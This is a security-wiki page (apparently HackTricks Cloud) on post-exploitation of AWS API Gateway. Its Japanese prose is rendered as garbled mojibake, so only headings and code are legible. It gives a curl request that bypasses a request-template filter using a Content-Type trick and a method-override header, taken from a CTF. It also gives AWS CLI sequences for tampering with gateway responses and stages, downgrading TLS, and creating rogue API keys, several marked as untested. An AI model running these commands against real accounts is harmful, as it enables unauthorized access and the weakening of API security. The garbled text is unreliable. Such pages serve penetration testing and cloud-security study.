# AWS - API Gateway Post Exploitation

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹ã€‚**
* **PRã‚’æå‡ºã—ã¦ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹** [**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã€‚

</details>
{% endhint %}

## API Gateway

è©³ç´°ã«ã¤ã„ã¦ã¯ä»¥ä¸‹ã‚’å‚ç…§ã—ã¦ãã ã•ã„:

{% content-ref url="../aws-services/aws-api-gateway-enum.md" %}
[aws-api-gateway-enum.md](../aws-services/aws-api-gateway-enum.md)
{% endcontent-ref %}

### éå…¬é–‹APIã¸ã®ã‚¢ã‚¯ã‚»ã‚¹

[https://us-east-1.console.aws.amazon.com/vpc/home#CreateVpcEndpoint](https://us-east-1.console.aws.amazon.com/vpc/home?region=us-east-1#CreateVpcEndpoint:)ã§`com.amazonaws.us-east-1.execute-api`ã‚µãƒ¼ãƒ“ã‚¹ã‚’ä½¿ç”¨ã—ã¦ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’ä½œæˆã—ã€ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ãªãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ï¼ˆãŠãã‚‰ãEC2ãƒã‚·ãƒ³çµŒç”±ï¼‰ã«ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’å…¬é–‹ã—ã€ã™ã¹ã¦ã®æ¥ç¶šã‚’è¨±å¯ã™ã‚‹ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚°ãƒ«ãƒ¼ãƒ—ã‚’å‰²ã‚Šå½“ã¦ã¾ã™ã€‚\
ãã®å¾Œã€EC2ãƒã‚·ãƒ³ã‹ã‚‰ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã€ä»¥å‰ã¯å…¬é–‹ã•ã‚Œã¦ã„ãªã‹ã£ãŸã‚²ãƒ¼ãƒˆã‚¦ã‚§ã‚¤APIã‚’å‘¼ã³å‡ºã™ã“ã¨ãŒã§ãã¾ã™ã€‚

### ãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒœãƒ‡ã‚£ã®ãƒ‘ã‚¹ã‚¹ãƒ«ãƒ¼ã‚’ãƒã‚¤ãƒ‘ã‚¹

ã“ã®æŠ€è¡“ã¯[**ã“ã®CTFã®æ›¸ãèµ·ã“ã—**](https://blog-tyage-net.translate.goog/post/2023/2023-09-03-midnightsun/?\_x\_tr\_sl=en&\_x\_tr\_tl=es&\_x\_tr\_hl=en&\_x\_tr\_pto=wapp)ã§ç™ºè¦‹ã•ã‚Œã¾ã—ãŸã€‚

[**AWSãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ**](https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-apigateway-method-integration.html)ã®`PassthroughBehavior`ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã«ç¤ºã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«ã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®**Content-Type**ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹éš›ã®å€¤**`WHEN_NO_MATCH`**ã¯ã€å¤‰æ›ãªã—ã§ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ã«æ¸¡ã—ã¾ã™ã€‚

ã—ãŸãŒã£ã¦ã€CTFã§ã¯ã€API Gatewayã«çµ±åˆãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆãŒã‚ã‚Šã€`Content-Type: application/json`ã§ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒé€ä¿¡ã•ã‚ŒãŸå ´åˆã€ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã§ãƒ•ãƒ©ã‚°ãŒæ¼æ´©ã™ã‚‹ã®ã‚’é˜²ã„ã§ã„ã¾ã—ãŸ:

{% code overflow="wrap" %}
```yaml
RequestTemplates:
application/json: '{"TableName":"Movies","IndexName":"MovieName-Index","KeyConditionExpression":"moviename=:moviename","FilterExpression": "not contains(#description, :flagstring)","ExpressionAttributeNames": {"#description": "description"},"ExpressionAttributeValues":{":moviename":{"S":"$util.escapeJavaScript($input.params(''moviename''))"},":flagstring":{"S":"midnight"}}}'
```
{% endcode %}

ã—ã‹ã—ã€**`Content-type: text/json`** ã‚’ä½¿ç”¨ã—ã¦ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹ã¨ã€ãã®ãƒ•ã‚£ãƒ«ã‚¿ã‚’å›é¿ã§ãã¾ã™ã€‚&#x20;

æœ€å¾Œã«ã€API GatewayãŒ `Get` ã¨ `Options` ã®ã¿ã‚’è¨±å¯ã—ã¦ã„ãŸãŸã‚ã€ãƒœãƒ‡ã‚£ã«ã‚¯ã‚¨ãƒªã‚’å«ã‚€POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã—ã€ãƒ˜ãƒƒãƒ€ãƒ¼ `X-HTTP-Method-Override: GET` ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€ä»»æ„ã®dynamoDBã‚¯ã‚¨ãƒªã‚’åˆ¶é™ãªãé€ä¿¡ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã—ãŸã€‚

{% code overflow="wrap" %}
```bash
curl https://vu5bqggmfc.execute-api.eu-north-1.amazonaws.com/prod/movies/hackers -H 'X-HTTP-Method-Override: GET' -H 'Content-Type: text/json'  --data '{"TableName":"Movies","IndexName":"MovieName-Index","KeyConditionExpression":"moviename = :moviename","ExpressionAttributeValues":{":moviename":{"S":"hackers"}}}'
```
{% endcode %}

### Usage Plans DoS

**Enumeration** ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§ã¯ã€ã‚­ãƒ¼ã® **usage plan ã‚’å–å¾—ã™ã‚‹æ–¹æ³•**ãŒèª¬æ˜ã•ã‚Œã¦ã„ã¾ã™ã€‚ã‚­ãƒ¼ã‚’æŒã£ã¦ã„ã¦ã€ãã‚ŒãŒ **æœˆã« X å›ã®ä½¿ç”¨ã«åˆ¶é™**ã•ã‚Œã¦ã„ã‚‹å ´åˆã€**ãã‚Œã‚’ä½¿ã£ã¦ DoS ã‚’å¼•ãèµ·ã“ã™**ã“ã¨ãŒã§ãã¾ã™ã€‚

**API Key** ã¯ã€**`x-api-key`** ã¨ã„ã† **HTTP ãƒ˜ãƒƒãƒ€ãƒ¼**ã« **å«ã‚ã‚‹**ã ã‘ã§æ¸ˆã¿ã¾ã™ã€‚

### `apigateway:UpdateGatewayResponse`, `apigateway:CreateDeployment`

`apigateway:UpdateGatewayResponse` ãŠã‚ˆã³ `apigateway:CreateDeployment` ã®æ¨©é™ã‚’æŒã¤æ”»æ’ƒè€…ã¯ã€**æ—¢å­˜ã® Gateway Response ã‚’å¤‰æ›´ã—ã¦ã€æ©Ÿå¯†æƒ…å ±ã‚’æ¼æ´©ã•ã›ã‚‹ã‚«ã‚¹ã‚¿ãƒ ãƒ˜ãƒƒãƒ€ãƒ¼ã‚„ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚’å«ã‚ãŸã‚Šã€æ‚ªæ„ã®ã‚ã‚‹ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å®Ÿè¡Œã•ã›ãŸã‚Šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™**ã€‚

{% code overflow="wrap" %}
```bash
API_ID="your-api-id"
RESPONSE_TYPE="DEFAULT_4XX"

# Update the Gateway Response
aws apigateway update-gateway-response --rest-api-id $API_ID --response-type $RESPONSE_TYPE --patch-operations op=replace,path=/responseTemplates/application~1json,value="{\"message\":\"$context.error.message\", \"malicious_header\":\"malicious_value\"}"

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
{% endcode %}

**æ½œåœ¨çš„ãªå½±éŸ¿**: æ©Ÿå¯†æƒ…å ±ã®æ¼æ´©ã€æ‚ªæ„ã®ã‚ã‚‹ã‚¹ã‚¯ãƒªãƒ—ãƒˆã®å®Ÿè¡Œã€ã¾ãŸã¯APIãƒªã‚½ãƒ¼ã‚¹ã¸ã®ä¸æ­£ã‚¢ã‚¯ã‚»ã‚¹ã€‚

{% hint style="info" %}
ãƒ†ã‚¹ãƒˆãŒå¿…è¦
{% endhint %}

### `apigateway:UpdateStage`, `apigateway:CreateDeployment`

`apigateway:UpdateStage`ãŠã‚ˆã³`apigateway:CreateDeployment`ã®æ¨©é™ã‚’æŒã¤æ”»æ’ƒè€…ã¯ã€**æ—¢å­˜ã®API Gatewayã‚¹ãƒ†ãƒ¼ã‚¸ã‚’å¤‰æ›´ã—ã¦ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã‚’åˆ¥ã®ã‚¹ãƒ†ãƒ¼ã‚¸ã«ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆã—ãŸã‚Šã€ã‚­ãƒ£ãƒƒã‚·ãƒ¥è¨­å®šã‚’å¤‰æ›´ã—ã¦ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã•ã‚ŒãŸãƒ‡ãƒ¼ã‚¿ã«ä¸æ­£ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™**ã€‚

{% code overflow="wrap" %}
```bash
API_ID="your-api-id"
STAGE_NAME="Prod"

# Update the API Gateway stage
aws apigateway update-stage --rest-api-id $API_ID --stage-name $STAGE_NAME --patch-operations op=replace,path=/cacheClusterEnabled,value=true,op=replace,path=/cacheClusterSize,value="0.5"

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
{% endcode %}

**æ½œåœ¨çš„å½±éŸ¿**: ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã•ã‚ŒãŸãƒ‡ãƒ¼ã‚¿ã¸ã®ä¸æ­£ã‚¢ã‚¯ã‚»ã‚¹ã€APIãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã®å¦¨å®³ã‚„å‚å—ã€‚

{% hint style="info" %}
ãƒ†ã‚¹ãƒˆãŒå¿…è¦
{% endhint %}

### `apigateway:PutMethodResponse`, `apigateway:CreateDeployment`

`apigateway:PutMethodResponse`ã¨`apigateway:CreateDeployment`ã®æ¨©é™ã‚’æŒã¤æ”»æ’ƒè€…ã¯ã€**æ—¢å­˜ã®API Gateway REST APIãƒ¡ã‚½ãƒƒãƒ‰ã®ãƒ¡ã‚½ãƒƒãƒ‰ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã‚’å¤‰æ›´ã—ã€ã‚«ã‚¹ã‚¿ãƒ ãƒ˜ãƒƒãƒ€ãƒ¼ã‚„ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚’å«ã‚ã‚‹ã“ã¨ã§ã€æ©Ÿå¯†æƒ…å ±ã‚’æ¼æ´©ã•ã›ãŸã‚Šã€æ‚ªæ„ã®ã‚ã‚‹ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å®Ÿè¡Œã•ã›ãŸã‚Šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™**ã€‚
```bash
API_ID="your-api-id"
RESOURCE_ID="your-resource-id"
HTTP_METHOD="GET"
STATUS_CODE="200"

# Update the method response
aws apigateway put-method-response --rest-api-id $API_ID --resource-id $RESOURCE_ID --http-method $HTTP_METHOD --status-code $STATUS_CODE --response-parameters "method.response.header.malicious_header=true"

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
**æ½œåœ¨çš„å½±éŸ¿**: æ©Ÿå¯†æƒ…å ±ã®æ¼æ´©ã€æ‚ªæ„ã®ã‚ã‚‹ã‚¹ã‚¯ãƒªãƒ—ãƒˆã®å®Ÿè¡Œã€ã¾ãŸã¯APIãƒªã‚½ãƒ¼ã‚¹ã¸ã®ä¸æ­£ã‚¢ã‚¯ã‚»ã‚¹ã€‚

{% hint style="info" %}
ãƒ†ã‚¹ãƒˆãŒå¿…è¦
{% endhint %}

### `apigateway:UpdateRestApi`, `apigateway:CreateDeployment`

`apigateway:UpdateRestApi`ãŠã‚ˆã³`apigateway:CreateDeployment`ã®æ¨©é™ã‚’æŒã¤æ”»æ’ƒè€…ã¯ã€**API Gateway REST APIã®è¨­å®šã‚’å¤‰æ›´ã—ã¦ãƒ­ã‚°ã‚’ç„¡åŠ¹ã«ã—ãŸã‚Šã€æœ€å°TLSãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’å¤‰æ›´ã—ãŸã‚Šã—ã¦ã€APIã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’å¼±ä½“åŒ–ã•ã›ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™**ã€‚
```bash
API_ID="your-api-id"

# Update the REST API settings
aws apigateway update-rest-api --rest-api-id $API_ID --patch-operations op=replace,path=/minimumTlsVersion,value='TLS_1.0',op=replace,path=/apiKeySource,value='AUTHORIZER'

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
**æ½œåœ¨çš„å½±éŸ¿**: APIã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’å¼±ã‚ã€è¨±å¯ã•ã‚Œã¦ã„ãªã„ã‚¢ã‚¯ã‚»ã‚¹ã‚„æ©Ÿå¯†æƒ…å ±ã®éœ²å‡ºã‚’å¼•ãèµ·ã“ã™å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

{% hint style="info" %}
ãƒ†ã‚¹ãƒˆãŒå¿…è¦
{% endhint %}

### `apigateway:CreateApiKey`, `apigateway:UpdateApiKey`, `apigateway:CreateUsagePlan`, `apigateway:CreateUsagePlanKey`

`apigateway:CreateApiKey`, `apigateway:UpdateApiKey`, `apigateway:CreateUsagePlan`, ãŠã‚ˆã³ `apigateway:CreateUsagePlanKey` ã®æ¨©é™ã‚’æŒã¤æ”»æ’ƒè€…ã¯ã€**æ–°ã—ã„APIã‚­ãƒ¼ã‚’ä½œæˆã—ã€ãã‚Œã‚‰ã‚’ä½¿ç”¨ãƒ—ãƒ©ãƒ³ã«é–¢é€£ä»˜ã‘ã€ã“ã‚Œã‚‰ã®ã‚­ãƒ¼ã‚’ä½¿ç”¨ã—ã¦APIã¸ã®ä¸æ­£ã‚¢ã‚¯ã‚»ã‚¹ã‚’è¡Œã†ã“ã¨ãŒã§ãã¾ã™**ã€‚
```bash
# Create a new API key
API_KEY=$(aws apigateway create-api-key --enabled --output text --query 'id')

# Create a new usage plan
USAGE_PLAN=$(aws apigateway create-usage-plan --name "MaliciousUsagePlan" --output text --query 'id')

# Associate the API key with the usage plan
aws apigateway create-usage-plan-key --usage-plan-id $USAGE_PLAN --key-id $API_KEY --key-type API_KEY
```
**æ½œåœ¨çš„ãªå½±éŸ¿**: APIãƒªã‚½ãƒ¼ã‚¹ã¸ã®ä¸æ­£ã‚¢ã‚¯ã‚»ã‚¹ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ«ã®å›é¿ã€‚

{% hint style="info" %}
ãƒ†ã‚¹ãƒˆãŒå¿…è¦
{% endhint %}

{% hint style="success" %}
AWS Hackingã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hackingã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **PRã‚’æå‡ºã—ã¦** [**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã§ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚

</details>
{% endhint %}
